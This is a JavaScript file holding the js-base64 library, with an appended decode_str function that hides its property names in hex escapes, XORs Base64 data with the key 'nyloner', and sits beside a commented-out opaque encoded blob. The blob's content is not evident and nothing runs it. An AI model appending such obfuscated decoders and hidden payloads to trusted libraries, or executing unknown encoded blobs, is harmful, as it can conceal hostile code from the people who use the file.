/*
 * $Id: base64.js,v 2.15 2014/04/05 12:58:57 dankogai Exp dankogai $
 *
 *  Licensed under the BSD 3-Clause License.
 *    http://opensource.org/licenses/BSD-3-Clause
 *
 *  References:
 *    http://en.wikipedia.org/wiki/Base64
 */

(function (global) {
    // existing version for noConflict()
    var _Base64 = global.Base64;
    var version = "2.1.9";
    // if node.js, we use Buffer
    var buffer;
    if (typeof module !== 'undefined' && module.exports) {
        try {
            buffer = require('buffer').Buffer;
        } catch (err) {
        }
    }
    // constants
    var b64chars
        = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    var b64tab = function (bin) {
        var t = {};
        for (var i = 0, l = bin.length; i < l; i++) t[bin.charAt(i)] = i;
        return t;
    }(b64chars);
    var fromCharCode = String.fromCharCode;
    // encoder stuff
    var cb_utob = function (c) {
        if (c.length < 2) {
            var cc = c.charCodeAt(0);
            return cc < 0x80 ? c
                : cc < 0x800 ? (fromCharCode(0xc0 | (cc >>> 6))
                + fromCharCode(0x80 | (cc & 0x3f)))
                    : (fromCharCode(0xe0 | ((cc >>> 12) & 0x0f))
                    + fromCharCode(0x80 | ((cc >>> 6) & 0x3f))
                    + fromCharCode(0x80 | ( cc & 0x3f)));
        } else {
            var cc = 0x10000
                + (c.charCodeAt(0) - 0xD800) * 0x400
                + (c.charCodeAt(1) - 0xDC00);
            return (fromCharCode(0xf0 | ((cc >>> 18) & 0x07))
            + fromCharCode(0x80 | ((cc >>> 12) & 0x3f))
            + fromCharCode(0x80 | ((cc >>> 6) & 0x3f))
            + fromCharCode(0x80 | ( cc & 0x3f)));
        }
    };
    var re_utob = /[\uD800-\uDBFF][\uDC00-\uDFFFF]|[^\x00-\x7F]/g;
    var utob = function (u) {
        return u.replace(re_utob, cb_utob);
    };
    var cb_encode = function (ccc) {
        var padlen = [0, 2, 1][ccc.length % 3],
            ord = ccc.charCodeAt(0) << 16
                | ((ccc.length > 1 ? ccc.charCodeAt(1) : 0) << 8)
                | ((ccc.length > 2 ? ccc.charCodeAt(2) : 0)),
            chars = [
                b64chars.charAt(ord >>> 18),
                b64chars.charAt((ord >>> 12) & 63),
                padlen >= 2 ? '=' : b64chars.charAt((ord >>> 6) & 63),
                padlen >= 1 ? '=' : b64chars.charAt(ord & 63)
            ];
        return chars.join('');
    };
    var btoa = global.btoa ? function (b) {
        return global.btoa(b);
    } : function (b) {
        return b.replace(/[\s\S]{1,3}/g, cb_encode);
    };
    var _encode = buffer ? function (u) {
            return (u.constructor === buffer.constructor ? u : new buffer(u))
                .toString('base64')
        }
            : function (u) {
                return btoa(utob(u))
            }
    ;
    var encode = function (u, urisafe) {
        return !urisafe
            ? _encode(String(u))
            : _encode(String(u)).replace(/[+\/]/g, function (m0) {
                return m0 == '+' ? '-' : '_';
            }).replace(/=/g, '');
    };
    var encodeURI = function (u) {
        return encode(u, true)
    };
    // decoder stuff
    var re_btou = new RegExp([
        '[\xC0-\xDF][\x80-\xBF]',
        '[\xE0-\xEF][\x80-\xBF]{2}',
        '[\xF0-\xF7][\x80-\xBF]{3}'
    ].join('|'), 'g');
    var cb_btou = function (cccc) {
        switch (cccc.length) {
            case 4:
                var cp = ((0x07 & cccc.charCodeAt(0)) << 18)
                        | ((0x3f & cccc.charCodeAt(1)) << 12)
                        | ((0x3f & cccc.charCodeAt(2)) << 6)
                        | (0x3f & cccc.charCodeAt(3)),
                    offset = cp - 0x10000;
                return (fromCharCode((offset >>> 10) + 0xD800)
                + fromCharCode((offset & 0x3FF) + 0xDC00));
            case 3:
                return fromCharCode(
                    ((0x0f & cccc.charCodeAt(0)) << 12)
                    | ((0x3f & cccc.charCodeAt(1)) << 6)
                    | (0x3f & cccc.charCodeAt(2))
                );
            default:
                return fromCharCode(
                    ((0x1f & cccc.charCodeAt(0)) << 6)
                    | (0x3f & cccc.charCodeAt(1))
                );
        }
    };
    var btou = function (b) {
        return b.replace(re_btou, cb_btou);
    };
    var cb_decode = function (cccc) {
        var len = cccc.length,
            padlen = len % 4,
            n = (len > 0 ? b64tab[cccc.charAt(0)] << 18 : 0)
                | (len > 1 ? b64tab[cccc.charAt(1)] << 12 : 0)
                | (len > 2 ? b64tab[cccc.charAt(2)] << 6 : 0)
                | (len > 3 ? b64tab[cccc.charAt(3)] : 0),
            chars = [
                fromCharCode(n >>> 16),
                fromCharCode((n >>> 8) & 0xff),
                fromCharCode(n & 0xff)
            ];
        chars.length -= [0, 0, 2, 1][padlen];
        return chars.join('');
    };
    var atob = global.atob ? function (a) {
        return global.atob(a);
    } : function (a) {
        return a.replace(/[\s\S]{1,4}/g, cb_decode);
    };
    var _decode = buffer ? function (a) {
        return (a.constructor === buffer.constructor
            ? a : new buffer(a, 'base64')).toString();
    }
        : function (a) {
            return btou(atob(a))
        };
    var decode = function (a) {
        return _decode(
            String(a).replace(/[-_]/g, function (m0) {
                return m0 == '-' ? '+' : '/'
            })
                .replace(/[^A-Za-z0-9\+\/]/g, '')
        );
    };
    var noConflict = function () {
        var Base64 = global.Base64;
        global.Base64 = _Base64;
        return Base64;
    };
    // export Base64
    global.Base64 = {
        VERSION: version,
        atob: atob,
        btoa: btoa,
        fromBase64: decode,
        toBase64: encode,
        utob: utob,
        encode: encode,
        encodeURI: encodeURI,
        btou: btou,
        decode: decode,
        noConflict: noConflict
    };
    // if ES5 is available, make Base64.extendString() available
    if (typeof Object.defineProperty === 'function') {
        var noEnum = function (v) {
            return {value: v, enumerable: false, writable: true, configurable: true};
        };
        global.Base64.extendString = function () {
            Object.defineProperty(
                String.prototype, 'fromBase64', noEnum(function () {
                    return decode(this)
                }));
            Object.defineProperty(
                String.prototype, 'toBase64', noEnum(function (urisafe) {
                    return encode(this, urisafe)
                }));
            Object.defineProperty(
                String.prototype, 'toBase64URI', noEnum(function () {
                    return encode(this, true)
                }));
        };
    }
    // that's it!
    if (global['Meteor']) {
        Base64 = global.Base64; // for normal export in Meteor.js
    }
    if (typeof module !== 'undefined' && module.exports) {
        module.exports.Base64 = global.Base64;
    }
    if (typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define([], function () {
            return global.Base64
        });
    }
})(typeof self !== 'undefined' ? self
    : typeof window !== 'undefined' ? window
        : typeof global !== 'undefined' ? global
            : this
);

function decode_str(scHZjLUh1) {
    scHZjLUh1 = Base64["\x64\x65\x63\x6f\x64\x65"](scHZjLUh1);
    key = '\x6e\x79\x6c\x6f\x6e\x65\x72';
    len = key["\x6c\x65\x6e\x67\x74\x68"];
    code = '';
    for (i = 0; i < scHZjLUh1["\x6c\x65\x6e\x67\x74\x68"]; i++) {
        var coeFYlqUm2 = i % len;
        code +=  String.fromCharCode(scHZjLUh1["\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74"](i) ^ key["\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74"](coeFYlqUm2))
    }
    return Base64["\x64\x65\x63\x6f\x64\x65"](code)
}

// sc = "OUofBg89Mwc2BS4HKCYJACAFI1Q+BB5dIwQ8RycQGwgnCzAYGgI+ByobLxAjOwVQPT0wHyYtL0IPLl0DJw8dCTAGJhkoJgUNISsJET8ENAsiOjREIz05WSAhPwcfPxgJAAskCQ8sJ1M7LTAUIjosByE9ORojMSteNQYmFiohJwolLCQSEF0zXCYEChUnEwdaITEZBzUvLgcBNQINNjwnUzstMBUiKiBHIi0tWyIxOxQwKCpeKhgvSCMFIx87AEkfJiYWGw8hLQYhDDMHNDgMFikYKwMgBScSPxdNFSIEMBsiOi0GDSJLFx0vJlgsMSdMIzsFUDsHDgsmADcCDC45BiEMMwc0Bi4WKiFeDiMsXhw/FzgUISoKBSAtAxUjHDhXNS8tWSwfAg4lBQECOwQ8WCIHUQggOlgVIwxGFzQWJgcpMS8QDyhXHBYtMFomLSxHIS0HWicMBQkwAj0eByU7ECMGLww/BDgUID1VBSE6XBYjHDMWNygAGSsmAQMhFiRcPi07WyYDCQUnEwMIJw87GTQFW1spGCsAIRZaHzwHMB8mLS8FDEomXycPHQkwBggZKjYvECAsLwwWKRUYNT0sRCc6JRYjITdbNTguWikmJwMlKytVPQQ4XSAEKAUnF1wcJy0BBxg0LgcqGy8QITsnEj4EHhYjBCAFIxBYFiE2Ox0wLyUZB0EkSSUFAQI7BBJZIDoOGyI6LQYKIh4aIz8mWCwxJwAhKytQPjo4WCM6LAgnPSlfIQ8zXzYGJhQsHF4KJScdDBM2OAUgByQbIy0lFSIPOxk0L1sXKDFaSyUGGQI7ADsaDAA0GyEQLQYhITNaNC8mHSwxJEkNOF8JOwQWCyYELAUjLQcbIyEVGjQGIgkoJj9PISs7Uz8ENAUJPRIVCwAmHw0mO1gwLyYWKDYFDCE7CVE+BDwWIgdRRiAQJRwnJjgZG18lXiwYAR4lBQkSPSo4BSMtJBsKPgAbNDY7WDAvJhcoNitMIDsvUT46MBYmKiBCIRMtXiEPN1wwAl8dLDodEA03Lww9BzgFIjogCyITC1wiDytbNQY+GSwbGR4lASwTEQAoBSAHJBshLQdaITY7HTAvJV4EJV8VJQUBAjsEMBsiOg4GIz0LGyMPPwk0OD5YKDY7TyErDQwUPQ4LChcvAg06JVknJjtfNi9bFysmIwwhOztUPgQ8XSYHEhUnFy4ZDQsjBzYFLgcqJgVMIzwnFjstM1wOOVQeJxMDCCcPOxk0OAQaKDYJDSEFIwI/OihaIiowRCM9IQYINgUJHBUlHgYxJ08lLCcdPzoaGSA6MAcjLQcWIg83WjQvJh0sMSQODlwkVTsEFgsmBA5HIS0HBiImMwcdKwMaPyEnTyUsJxw/KjxZIzokRiItJRUnITdeNgYuXyoYLwAlAV4WOyYKBQ42JBshEC0GIzErFDUGJhkrMVoAIisvEDwqLAUjLSQbDT5VFgomO1gwLyZbKiYFTCUGGQI7ACscDTkwGyEQLQYjDzMWNj9fGSoxXgAhFi8dPCoWGyEqCkMgACZWIiYwWTABAxksGAEeJQUrHD8tTVgiF1EKIz01GiExJwc1Ly4HBjVXAAgsJ1M7LTBZIDoORycQGwgnCyAeGzs6ByobLxAhBS8dPT1JGyAtVQsjAC0XIx8dXjY4AF4oMSRAICwsUjsDFRsmBAoVJxMpFyMMRlo3P1sWKwgrDCEWJxY7LTMbDV0vQicTAwgnDxlbNjgEBykxLxAIKAIRKD0wWiYtLAsjPSlaIjEzWjU4JhQsNisDIwU/UD0ENFkmAFUBJzEfBg89Mwc2BS4HKiY7DCE7O1E+BChdIwQgCCAAJRwnJjgZG18lXiwYAR4lBQlRPSoeBSMtJBsKPgAbNDY7WDAvJhcoNitMIDsvUT46MBYmKiAIIRM9WiEPPxQwAl4K"
// console.log(decode_str(sc))